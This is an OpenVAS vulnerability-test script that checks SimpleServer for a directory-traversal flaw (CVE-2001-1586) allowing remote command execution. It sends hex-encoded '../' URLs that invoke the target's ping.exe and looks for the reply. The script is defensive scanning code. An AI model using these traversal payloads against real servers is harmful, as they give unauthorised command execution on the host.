# OpenVAS Vulnerability Test
# $Id: simplewww.nasl 6056 2017-05-02 09:02:50Z teissa $
# Description: SimpleServer remote execution
#
# Authors:
# Mathieu Meadele <mm@omnix.net>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID
# (minor changes by rd)
#
# Copyright:
# Copyright (C) 2001 Mathieu Meadele <mm@omnix.net>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_solution = "Upgrade SimpleServer to version 1.15.";

tag_summary = "By sending a specially encoded string to the remote server,
it is possible to execute remote commands with the 
privileges of the server.";

if(description)
{
 script_id(10705);
 script_version("$Revision: 6056 $");
 script_tag(name:"last_modification", value:"$Date: 2017-05-02 11:02:50 +0200 (Tue, 02 May 2017) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_cve_id("CVE-2001-1586");
 script_bugtraq_id(3112);
 name  = "SimpleServer remote execution";

 script_name(name);


 summary = "Check the remote execution vulnerability in SimpleServer";


 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");

 script_copyright("Copyright (C) 2001 Mathieu Meadele <mm@omnix.net>");

 family  = "Gain a shell remotely";
 script_family(family);
 script_dependencies("gb_get_http_banner.nasl");
 script_mandatory_keys("SimpleServer/banner");
 script_require_ports("Services/www", 80);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "solution" , value : tag_solution);
 exit(0);
}

#  we are sending a hexadecimal encoded url, with the cgi-bin prefix,
#  (even if this one doesn't exist), this allowing us to break out the root
#  folder.

#  start here


include("http_func.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if("SimpleServer" >!< banner) exit(0);


 match = "Reply from 127.0.0.1";
 
 strnt = http_get(item:string("/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1"),
	 port:port);

 str9x  = http_get(item:string("/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1"),
	 port:port);
	 

soc = http_open_socket(port);
if(soc) 
{
  send(socket:soc, data:str9x);
  inc1 = http_recv(socket:soc);
  http_close_socket(soc);
  if( match >< inc1 ) {
     security_message(port);
     exit(0);
     }
}
  
soc = http_open_socket(port);
if(soc)
{
  send(socket:soc, data:strnt);
  inc2 = http_recv(socket:soc);
  http_close_socket(soc);

  if( match >< inc2 ) {
     security_message(port);
     }
 }

